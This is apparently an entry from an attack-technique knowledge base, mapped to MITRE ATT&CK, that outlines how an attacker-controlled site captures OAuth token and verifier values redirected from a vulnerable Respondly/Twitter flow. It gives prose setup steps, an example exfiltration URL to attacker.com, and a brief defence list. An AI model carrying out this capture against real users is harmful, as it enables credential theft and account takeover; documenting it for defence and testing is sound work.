---
id: proc-respondly-capture-001
name: Capture-OAuth-Token-and-Verifier
type: procedure
verified: false
submitted: true
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:35.336Z'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Unsecured Credentials]]'
sub_techniques: []
tags:
  - token-theft
  - credential-capture
  - oauth
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---

# Capture-OAuth-Token-and-Verifier

## Summary

This procedure sets up an attacker-controlled site to intercept and log the OAuth token and verifier parameters redirected from the vulnerable Respondly flow after victim authorization.

## Description

Upon completion of Twitter authorization, the OAuth process appends oauth_token and oauth_verifier to the redirect URL. The attacker site captures these for use in exchanging for access tokens, enabling phishing, account takeover, or data exfiltration.

## Requirements

1. Attacker-controlled domain with logging capability
2. Completion of prior authorization step
3. Basic web server to handle GET requests

## Defense

Defensive measures and detection strategies:

- Encrypt or secure OAuth parameters in transit
- Implement state parameters to prevent CSRF in OAuth
- Log and alert on anomalous token requests

## Objectives

1. Receive and log redirected OAuth parameters
2. Store tokens for further exploitation
3. Validate usability of captured credentials

## Instructions

### Step 1: Set Up Capture Endpoint

**Context**: Host a simple page on your domain to log query parameters.

Use a web server (e.g., PHP, Node.js) to parse and save GET params from /callback.

### Step 2: Handle Incoming Redirect

**Context**: Process the redirect URL with appended parameters.

Example incoming: https://attacker.com/callback?oauth_token=abc123&oauth_verifier=xyz789

Log the values to a file or database.

### Step 3: Verify Capture

**Context**: Test the tokens by attempting OAuth completion.

Use the captured values in a Twitter API call to confirm access.

**Expected Output**: Successfully logged token and verifier; API access granted.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[token-theft]]
- [[credential-capture]]
- [[oauth]]
